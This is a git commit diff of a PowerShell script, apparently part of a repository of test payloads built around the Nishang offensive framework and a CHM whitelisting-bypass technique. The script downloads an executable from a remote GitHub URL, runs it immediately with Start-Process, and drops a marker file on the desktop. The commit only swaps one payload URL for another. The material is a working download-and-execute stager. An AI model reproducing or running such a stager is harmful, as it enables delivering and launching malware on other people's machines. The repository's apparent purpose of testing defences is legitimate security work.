9f573203e5dbcf73c3f20ebbc27e2514f8855233
NotSurprised <roro8016489@gmail.com>
2020-07-03 16:12:32 +0800

    20200703

--- Payload/nishang/NishangChmBypass.ps1
+++ Payload/nishang/NishangChmBypass.ps1
@@ -1,5 +1,5 @@
-$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/ReceiptAutoClose.exe'
-$output = "UnknownMaliciousFile.exe"
+$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Nishang/NishangChmOnlinePayload.exe'
+$output = "NishangChmOnlinePayloaded.exe"
 $start_time = Get-Date
 
 [ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 
@@ -8,6 +8,6 @@ wget $url -outfile $output
 
 Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
-Start-Process -FilePath "UnknownMaliciousFile.exe"
+Start-Process -FilePath "NishangChmOnlinePayloaded.exe"
 
 $DesktopPath = [Environment]::GetFolderPath('Desktop');echo "NishangChmBypass." >> $DesktopPath\\WLtester.txt
